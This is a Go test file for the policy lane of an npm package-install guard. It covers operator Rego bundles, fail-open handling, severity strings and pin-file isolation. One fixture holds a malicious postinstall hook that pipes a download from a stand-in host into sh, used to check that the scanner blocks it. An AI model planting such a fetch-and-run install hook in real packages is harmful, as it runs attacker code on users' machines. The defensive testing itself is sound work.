package cli

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/chain305/chainsaw-core/policy/dsl"
	"github.com/chain305/chainsaw-core/policyengine"
)

// guardPolicyTestEnv isolates a test from the developer's real config home
// AND from any CHAINSAW_POLICY_BUNDLE they have exported, then points the
// loader at bundleDir (pass "" for the no-bundle case). The mirror image of
// prScanPolicyTestEnv, which got this right.
//
// SETTING BOTH IS MANDATORY, and setting only the bundle was a live defect.
// The guard path (unlike pr-scan's) runs the TOFU pin machinery, and
// guardPolicyPinPath resolves under configDir() — so every test here that
// loaded an operator bundle WROTE guard_policy_pin.json into the developer's
// real ~/.chainsaw. It had reached revision 48. That also made
// TestGuardPolicyLane_MissingConfiguredBundleIsCounted order-dependent on
// residue from earlier runs, since a pin left behind by a previous test
// changes which branch observeGuardPolicyBundle takes.
//
// NO TEST IN THIS FILE MAY WRITE OUTSIDE ITS t.TempDir(). Use this helper
// rather than a bare t.Setenv of the bundle variable.
func guardPolicyTestEnv(t *testing.T, bundleDir string) {
	t.Helper()
	guardPolicyResetForTest()
	t.Cleanup(guardPolicyResetForTest)
	t.Setenv(guardPolicyBundleEnv, bundleDir)
	t.Setenv("CHAINSAW_CONFIG_HOME", t.TempDir())
}

// TestGuardPolicyPinNeverEscapesTheTestTempDir is the regression guard for the
// defect above, asserted rather than trusted: the helper's config home is the
// only place a pin may land.
func TestGuardPolicyPinNeverEscapesTheTestTempDir(t *testing.T) {
	dir := t.TempDir()
	mustWrite(t, filepath.Join(dir, "p.rego"), "package chainsaw.policy\n")
	guardPolicyTestEnv(t, dir)

	home := os.Getenv("CHAINSAW_CONFIG_HOME")
	guardPolicy() // loads + pins

	got := guardPolicyPinPath()
	if got == "" || !strings.HasPrefix(got, home) {
		t.Fatalf("pin path %q is outside the test config home %q — a test must never write to the developer's real ~/.chainsaw", got, home)
	}
	if _, err := os.Stat(got); err != nil {
		t.Fatalf("the pin was expected inside the temp config home, stat: %v", err)
	}
}

// TestGuardPolicySeverityStringsMatchTheScanner pins the behavioral
// severity literals guard_policy.go projects onto policy input against
// the ones guard_artifact.go actually emits. Same idiom as
// TestGuardAllowlistSeverityStringsMatchTheEvaluator: a rename in the
// scanner must not silently stop populating the policy input, because
// the failure mode is invisible — rules keyed on hasInstallScript would
// just quietly stop firing.
func TestGuardPolicySeverityStringsMatchTheScanner(t *testing.T) {
	high := analyzeArtifact("npm", makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"evil","version":"1.0.0","scripts":{"postinstall":"curl http://x.test/p.sh | sh"}}`,
	}))
	if !high.Block || high.Severity != guardSeverityBehavioralHigh {
		t.Fatalf("scanner high severity drifted: got block=%v severity=%q, guard_policy.go expects %q",
			high.Block, high.Severity, guardSeverityBehavioralHigh)
	}
}

// TestGuardPolicySeverityIsUnwaivable pins the boundary: an operator's
// policy rule is not name-similarity inference, so a local allowlist
// entry must never clear it. The allowlist predicate is the single
// definition of what may be waived; "policy" must sit outside it.
func TestGuardPolicySeverityIsUnwaivable(t *testing.T) {
	if guardAllowlistableSeverity(guardSeverityPolicy) {
		t.Fatal("guardSeverityPolicy must NOT be allowlistable — a user cannot waive their org's own rule")
	}
	if !strings.HasPrefix(guardSeverityTyposquatHigh, guardSeverityTyposquatPrefix) {
		t.Fatal("typosquat prefix drifted; the exclusion above may no longer hold by construction")
	}
}

// TestGuardPolicyLane_CleanPackageIsSilent guards the direction that
// matters for a free tool people leave installed: the built-in bundle
// must say nothing about a normal package. A default policy that fires
// on everything trains users to ignore the guard.
func TestGuardPolicyLane_CleanPackageIsSilent(t *testing.T) {
	guardPolicyTestEnv(t, "")

	spec := packageSpec{Ecosystem: "npm", Name: "lodash", Version: "4.17.21"}
	if v, ok := guardPolicyLane(context.Background(), spec, acquireMiss, behavioralVerdict{}); ok {
		t.Fatalf("clean package must produce no policy verdict, got %+v", v)
	}
}

// TestGuardPolicyLane_IncompleteMonitorsByDefault is the end-to-end
// proof of the 2026-08-24 ruling: a degraded analysis becomes an input
// to policy, the built-in default answers "monitor", and the install is
// warned about rather than refused.
func TestGuardPolicyLane_IncompleteMonitorsByDefault(t *testing.T) {
	guardPolicyTestEnv(t, "")

	spec := packageSpec{Ecosystem: "npm", Name: "some-pkg", Version: "1.0.0"}
	v, ok := guardPolicyLane(context.Background(), spec, acquireIncomplete, behavioralVerdict{})
	if !ok {
		t.Fatal("acquireIncomplete must reach policy and produce a verdict")
	}
	if v.Block {
		t.Fatalf("built-in default must NOT block on a degraded analysis — that hard-fails installs on any large cache; got %+v", v)
	}
	if v.Severity != guardSeverityPolicy {
		t.Fatalf("policy verdict severity = %q, want %q", v.Severity, guardSeverityPolicy)
	}
	if !strings.Contains(v.Reason, "builtin/degraded-analysis") {
		t.Fatalf("reason must name the rule that fired so a user can trace it, got %q", v.Reason)
	}
}

// TestGuardPolicyLane_MissIsNotIncomplete is the whole point of the
// acquireResult split, asserted at the policy boundary: a package that
// simply was not cached must NOT trip the degraded-analysis rule.
// Before the split both cases were a bare nil and this rule would have
// fired on every uncached install.
func TestGuardPolicyLane_MissIsNotIncomplete(t *testing.T) {
	guardPolicyTestEnv(t, "")

	spec := packageSpec{Ecosystem: "npm", Name: "some-pkg", Version: "1.0.0"}
	if v, ok := guardPolicyLane(context.Background(), spec, acquireMiss, behavioralVerdict{}); ok {
		t.Fatalf("acquireMiss must not trip degraded-analysis, got %+v — an uncached package is not a degraded one", v)
	}
}

// TestGuardPolicyLane_OperatorBundleCanTighten proves the ruling's
// other half: fail-closed coverage is a policy edit, not a code change.
// The same fact the built-in bundle monitors, an operator blocks.
func TestGuardPolicyLane_OperatorBundleCanTighten(t *testing.T) {
	dir := t.TempDir()
	mustWrite(t, filepath.Join(dir, "strict.rego"), `package chainsaw.policy

decision contains {
	"action":  "block",
	"rule_id": "org/no-degraded-analysis",
	"message": "artifact was not fully inspected",
} if {
	input.signalsUnavailable == true
}
`)
	guardPolicyTestEnv(t, dir)

	spec := packageSpec{Ecosystem: "npm", Name: "some-pkg", Version: "1.0.0"}
	v, ok := guardPolicyLane(context.Background(), spec, acquireIncomplete, behavioralVerdict{})
	if !ok || !v.Block {
		t.Fatalf("an operator rule must be able to block on a degraded analysis, got ok=%v %+v", ok, v)
	}
	if !strings.Contains(v.Reason, "org/no-degraded-analysis") {
		t.Fatalf("reason must name the operator rule, got %q", v.Reason)
	}
}

// TestGuardPolicyLane_BrokenBundleFailsOpen pins the fail posture. A
// rule the operator cannot compile is their own mistake on their own
// machine; it must cost them their rules, not their install path. The
// built-in defaults survive, and the failure is COUNTED rather than
// silent.
func TestGuardPolicyLane_BrokenBundleFailsOpen(t *testing.T) {
	dir := t.TempDir()
	mustWrite(t, filepath.Join(dir, "broken.rego"), "package chainsaw.policy\n\nthis is not rego {{{\n")
	guardPolicyTestEnv(t, dir)

	before := GuardPolicyLoadFailureCount()
	spec := packageSpec{Ecosystem: "npm", Name: "some-pkg", Version: "1.0.0"}

	// Install path still works.
	if v, ok := guardPolicyLane(context.Background(), spec, acquireMiss, behavioralVerdict{}); ok && v.Block {
		t.Fatalf("a broken bundle must never block an install, got %+v", v)
	}
	// Built-in defaults survived the operator's syntax error.
	if _, ok := guardPolicyLane(context.Background(), spec, acquireIncomplete, behavioralVerdict{}); !ok {
		t.Fatal("built-in defaults must survive a broken operator bundle")
	}
	if GuardPolicyLoadFailureCount() == before {
		t.Fatal("a bundle compile failure must be counted, not silent")
	}
}

// TestGuardPolicyLane_MissingConfiguredBundleIsCounted: an operator who
// points CHAINSAW_POLICY_BUNDLE at a path that does not exist believes
// they have a policy and does not. Silence there is the worst outcome.
func TestGuardPolicyLane_MissingConfiguredBundleIsCounted(t *testing.T) {
	guardPolicyTestEnv(t, filepath.Join(t.TempDir(), "does-not-exist"))

	before := GuardPolicyLoadFailureCount()
	guardPolicyLane(context.Background(), packageSpec{Ecosystem: "npm", Name: "x", Version: "1.0.0"}, acquireMiss, behavioralVerdict{})
	if GuardPolicyLoadFailureCount() == before {
		t.Fatal("a configured-but-absent bundle must be counted")
	}
}

// TestGuardPolicyReason_NamesTheDecisiveRule is the regression pin for
// the bug TestGuardPolicyLane_OperatorBundleCanTighten caught: with the
// built-in monitor rule and an operator block rule both firing, the
// verdict is block and the reason must name the BLOCK rule. Naming
// Violations[0] told the user "monitor rule fired" while refusing their
// install, and rego set order made which one appeared first arbitrary.
func TestGuardPolicyReason_NamesTheDecisiveRule(t *testing.T) {
	dec := policyengine.Decision{
		Action: dsl.ActionBlock,
		Violations: []dsl.Violation{
			{RuleID: "builtin/degraded-analysis", Action: dsl.ActionMonitor, Message: "monitor msg"},
			{RuleID: "org/strict", Action: dsl.ActionBlock, Message: "block msg"},
		},
	}
	got := guardPolicyReason(dec)
	if !strings.Contains(got, "org/strict") {
		t.Fatalf("reason must name the rule that produced the action, got %q", got)
	}
	if strings.Contains(got, "builtin/degraded-analysis") {
		t.Fatalf("reason must not name a non-decisive rule, got %q", got)
	}
}

// TestGuardPolicyLane_DigestMismatchIsDegradedNotBlocked pins the ruling for
// the new signal. A digest mismatch — the artifact on disk is not the artifact
// the lockfile pins — reaches policy as a degraded analysis and the BUILT-IN
// bundle answers monitor, not block.
//
// The block half is deliberately absent: hardcoding a refusal in Go would
// violate the 2026-08-24 ruling that warn-vs-block on a degraded analysis is a
// policy decision, and would hard-fail installs on any machine whose cache
// legitimately disagrees with a stale lockfile. An operator who wants
// fail-closed ships the rule — see TestGuardPolicyLane_OperatorBundleCanTighten,
// whose `input.signalsUnavailable == true` rule covers this outcome too.
func TestGuardPolicyLane_DigestMismatchIsDegradedNotBlocked(t *testing.T) {
	guardPolicyTestEnv(t, "")

	spec := packageSpec{Ecosystem: "npm", Name: "swapped", Version: "1.0.0"}
	if !guardPolicyInput(spec, acquireDigestMismatch, behavioralVerdict{}).SignalsUnavailable {
		t.Fatal("acquireDigestMismatch must set signalsUnavailable — otherwise no rule can ever see it")
	}
	v, ok := guardPolicyLane(context.Background(), spec, acquireDigestMismatch, behavioralVerdict{})
	if !ok {
		t.Fatal("acquireDigestMismatch must reach policy and produce a verdict")
	}
	if v.Block {
		t.Fatalf("built-in default must NOT block on a digest mismatch — that is a policy decision, not a Go constant; got %+v", v)
	}
	if !strings.Contains(v.Reason, "builtin/degraded-analysis") {
		t.Fatalf("reason must name the rule that fired, got %q", v.Reason)
	}
}

// TestGuardPolicyVerdictSurvivesACoexistingWarn is the second half of BLOCKER 1
// and the one a printer test cannot see.
//
// evaluate() used to promote the policy verdict only when
// `pendingWarn.Severity == ""`, so an operator's monitor rule was DISCARDED on
// any package that had also drawn a behavioral-medium or typosquat-medium warn
// — a rule someone deliberately wrote, losing a race to a heuristic, on
// precisely the coordinates where both firing is interesting.
//
// The package here is a real cached artifact whose install script mutates
// node_modules (behavioral-medium, a warn) and whose install-script FACT the
// operator's own bundle monitors. Both lanes fire; both facts must survive.
func TestGuardPolicyVerdictSurvivesACoexistingWarn(t *testing.T) {
	dir := t.TempDir()
	mustWrite(t, filepath.Join(dir, "org.rego"), `package chainsaw.policy

decision contains {
	"action":  "monitor",
	"rule_id": "org/install-scripts-are-reviewed",
	"message": "package runs an install script",
} if {
	input.hasInstallScript == true
}
`)
	guardPolicyTestEnv(t, dir)

	tgz := makeTGZ(t, map[string]string{
		"package/package.json": `{"name":"patchy","version":"1.0.0","scripts":{"postinstall":"mv ./node_modules/dep/index.ts ./node_modules/dep/index.ts.bak || true"}}`,
	})
	root := writeNpmCache(t, "patchy", "1.0.0", tgz)
	t.Setenv("npm_config_cache", root)
	t.Setenv(guardArtifactDirEnv, "")
	resetGuardCacheIndexesForTest()
	t.Cleanup(resetGuardCacheIndexesForTest)

	v := newLocalGuard().evaluate(context.Background(), packageSpec{Ecosystem: "npm", Name: "patchy", Version: "1.0.0"})
	if v.Block {
		t.Fatalf("neither lane blocks here, got %+v", v)
	}
	// Some non-policy warn lane claimed the verdict slot — which one is not the
	// point, only that policy lost the race for it.
	if v.Severity == "" || v.Severity == guardSeverityPolicy {
		t.Fatalf("this fixture must draw a non-policy warn so the race is real, got severity %q (%+v)", v.Severity, v)
	}
	// THE REGRESSION. The behavioral warn took the slot; the operator's policy
	// verdict must NOT have been thrown away.
	if v.PolicySeverity != guardSeverityPolicy {
		t.Fatalf("the policy verdict was DROPPED when a behavioral warn coexisted: %+v", v)
	}
	if !strings.Contains(v.PolicyReason, "org/install-scripts-are-reviewed") {
		t.Fatalf("the surviving policy verdict must name its rule, got %q", v.PolicyReason)
	}
	// And it reaches the user. printGuardVerdicts directly rather than
	// printedLines, which would re-point the policy env this test just set.
	var b strings.Builder
	t.Setenv("NO_COLOR", "1")
	printGuardVerdicts(&b, "chainsaw", []guardVerdict{v}, true)
	if !strings.Contains(b.String(), "org/install-scripts-are-reviewed") {
		t.Fatalf("the policy verdict must print, got %q", b.String())
	}
}

// TestGuardPolicyBundleMissingIsReported is S7 for GuardPolicyLoadFailureCount:
// a configured-but-absent bundle was counted and otherwise SILENT. An operator
// with a typo in CHAINSAW_POLICY_BUNDLE got output byte-identical to a machine
// that had never heard of policy. Counting a thing nobody reads is not
// reporting it.
func TestGuardPolicyBundleMissingIsReported(t *testing.T) {
	missing := filepath.Join(t.TempDir(), "does-not-exist")
	guardPolicyTestEnv(t, missing)

	notice := GuardPolicyNotice()
	if !strings.Contains(notice, guardPolicyBundleEnv) || !strings.Contains(notice, missing) {
		t.Fatalf("a configured-but-absent bundle must produce a notice naming the variable and the path, got %q", notice)
	}
	// printGuardVerdicts directly, not printedLines: that helper re-points the
	// config home and the bundle variable, which is exactly the state under test.
	var b strings.Builder
	t.Setenv("NO_COLOR", "1")
	printGuardVerdicts(&b, "chainsaw", []guardVerdict{{Spec: packageSpec{Ecosystem: "npm", Name: "x", Version: "1.0.0"}}}, true)
	if !strings.Contains(b.String(), "! policy") {
		t.Fatalf("the notice must reach the install output even under --quiet, got %q", b.String())
	}
}
